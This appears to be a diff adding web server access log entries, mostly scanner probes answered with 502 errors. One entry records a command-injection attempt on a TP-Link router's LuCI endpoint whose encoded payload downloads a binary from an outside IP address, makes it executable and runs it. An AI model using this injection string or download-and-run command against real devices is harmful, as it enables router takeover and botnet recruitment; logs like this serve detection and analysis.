@@ -1,0 +1,7 @@
+185.191.126.213 - - [08/Aug/2024:14:01:08 +0000] "GET / HTTP/1.1" 502 157 "-" "-" "-"
+52.228.153.100 - - [08/Aug/2024:14:36:27 +0000] "GET /druid/index.html HTTP/1.1" 502 157 "-" "Mozilla/5.0 zgrab/0.x" "-"
+149.50.103.48 - - [08/Aug/2024:14:48:23 +0000] "GET / HTTP/1.1" 502 157 "-" "-" "-"
+154.213.187.96 - - [08/Aug/2024:14:57:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 502 157 "-" "Go-http-client/1.1" "-"
+167.94.145.98 - - [08/Aug/2024:15:01:56 +0000] "GET / HTTP/1.1" 502 157 "-" "-" "-"
+167.94.145.98 - - [08/Aug/2024:15:02:05 +0000] "GET / HTTP/1.1" 502 157 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
+167.94.145.98 - - [08/Aug/2024:15:02:05 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
